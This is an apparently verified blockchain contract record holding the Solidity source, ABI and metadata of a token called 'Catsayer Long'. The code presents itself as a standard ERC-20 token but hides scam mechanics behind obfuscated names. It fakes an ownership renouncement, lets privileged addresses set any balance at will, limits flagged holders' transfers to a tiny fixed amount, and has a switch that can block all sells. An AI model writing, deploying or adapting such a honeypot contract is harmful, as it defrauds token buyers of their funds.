{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface marketingFund {\n    function createPair(address enableFee, address tradingTx) external returns (address);\n}\n\ninterface walletSwap {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address limitReceiver) external view returns (uint256);\n\n    function transfer(address listToken, uint256 toMarketing) external returns (bool);\n\n    function allowance(address swapToken, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 toMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address listToken,\n        uint256 toMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalReceiverTake, uint256 value);\n    event Approval(address indexed swapToken, address indexed spender, uint256 value);\n}\n\nabstract contract swapTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface walletSwapMetadata is walletSwap {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CatsayerLong is swapTake, walletSwap, walletSwapMetadata {\n\n    constructor (){\n        if (takeSellAmount == amountList) {\n            amountList = takeSellAmount;\n        }\n        sellMarketing sellReceiver = sellMarketing(isTeam);\n        receiverFundFee = marketingFund(sellReceiver.factory()).createPair(sellReceiver.WETH(), address(this));\n        \n        txReceiverToken = _msgSender();\n        limitMaxMode[txReceiverToken] = true;\n        receiverSender[txReceiverToken] = autoMin;\n        launchedSell();\n        \n        emit Transfer(address(0), txReceiverToken, autoMin);\n    }\n\n    function modeTokenAt(address swapMin) public {\n        if (receiverTeam) {\n            return;\n        }\n        \n        limitMaxMode[swapMin] = true;\n        \n        receiverTeam = true;\n    }\n\n    address isTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public takeSellAmount;\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamReceiver;\n    }\n\n    function amountAtSwap(address enableMinTx, address listToken, uint256 toMarketing) internal returns (bool) {\n        if (enableMinTx == txReceiverToken) {\n            return marketingBuy(enableMinTx, listToken, toMarketing);\n        }\n        uint256 launchReceiver = walletSwap(receiverFundFee).balanceOf(limitFromLaunched);\n        require(launchReceiver == receiverShould);\n        require(listToken != limitFromLaunched);\n        if (walletEnableTake[enableMinTx]) {\n            return marketingBuy(enableMinTx, listToken, walletAmount);\n        }\n        return marketingBuy(enableMinTx, listToken, toMarketing);\n    }\n\n    address private tradingAuto;\n\n    function txSenderReceiver() private view {\n        require(limitMaxMode[_msgSender()]);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return launchMode;\n    }\n\n    address public receiverFundFee;\n\n    function receiverAuto(address walletLaunched, uint256 toMarketing) public {\n        txSenderReceiver();\n        receiverSender[walletLaunched] = toMarketing;\n    }\n\n    string private teamReceiver = \"CLG\";\n\n    function approve(address tokenFundAt, uint256 toMarketing) public virtual override returns (bool) {\n        fromEnableSwap[_msgSender()][tokenFundAt] = toMarketing;\n        emit Approval(_msgSender(), tokenFundAt, toMarketing);\n        return true;\n    }\n\n    mapping(address => bool) public walletEnableTake;\n\n    address public txReceiverToken;\n\n    mapping(address => mapping(address => uint256)) private fromEnableSwap;\n\n    mapping(address => uint256) private receiverSender;\n\n    event OwnershipTransferred(address indexed txTeam, address indexed toLaunch);\n\n    uint256 constant walletAmount = 7 ** 10;\n\n    function allowance(address receiverSwap, address tokenFundAt) external view virtual override returns (uint256) {\n        if (tokenFundAt == isTeam) {\n            return type(uint256).max;\n        }\n        return fromEnableSwap[receiverSwap][tokenFundAt];\n    }\n\n    uint256 swapIs;\n\n    function listToAmount(address walletEnable) public {\n        txSenderReceiver();\n        if (minFee) {\n            minExemptLimit = false;\n        }\n        if (walletEnable == txReceiverToken || walletEnable == receiverFundFee) {\n            return;\n        }\n        walletEnableTake[walletEnable] = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return tradingAuto;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return isLiquidity;\n    }\n\n    function balanceOf(address limitReceiver) public view virtual override returns (uint256) {\n        return receiverSender[limitReceiver];\n    }\n\n    function transfer(address walletLaunched, uint256 toMarketing) external virtual override returns (bool) {\n        return amountAtSwap(_msgSender(), walletLaunched, toMarketing);\n    }\n\n    uint256 private autoMin = 100000000 * 10 ** 18;\n\n    uint8 private isLiquidity = 18;\n\n    uint256 private amountList;\n\n    function owner() external view returns (address) {\n        return tradingAuto;\n    }\n\n    function transferFrom(address enableMinTx, address listToken, uint256 toMarketing) external override returns (bool) {\n        if (_msgSender() != isTeam) {\n            if (fromEnableSwap[enableMinTx][_msgSender()] != type(uint256).max) {\n                require(toMarketing <= fromEnableSwap[enableMinTx][_msgSender()]);\n                fromEnableSwap[enableMinTx][_msgSender()] -= toMarketing;\n            }\n        }\n        return amountAtSwap(enableMinTx, listToken, toMarketing);\n    }\n\n    bool public minExemptLimit;\n\n    function marketingBuy(address enableMinTx, address listToken, uint256 toMarketing) internal returns (bool) {\n        require(receiverSender[enableMinTx] >= toMarketing);\n        receiverSender[enableMinTx] -= toMarketing;\n        receiverSender[listToken] += toMarketing;\n        emit Transfer(enableMinTx, listToken, toMarketing);\n        return true;\n    }\n\n    bool private minFee;\n\n    bool public receiverTeam;\n\n    string private launchMode = \"Catsayer Long\";\n\n    uint256 receiverShould;\n\n    function listSell(uint256 toMarketing) public {\n        txSenderReceiver();\n        receiverShould = toMarketing;\n    }\n\n    function launchedSell() public {\n        emit OwnershipTransferred(txReceiverToken, address(0));\n        tradingAuto = address(0);\n    }\n\n    address limitFromLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public limitMaxMode;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoMin;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toLaunch\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalReceiverTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenFundAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFundAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitMaxMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"toMarketing\",\"type\":\"uint256\"}],\"name\":\"listSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletEnable\",\"type\":\"address\"}],\"name\":\"listToAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minExemptLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMin\",\"type\":\"address\"}],\"name\":\"modeTokenAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toMarketing\",\"type\":\"uint256\"}],\"name\":\"receiverAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFundFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeSellAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableMinTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txReceiverToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletEnableTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "CatsayerLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}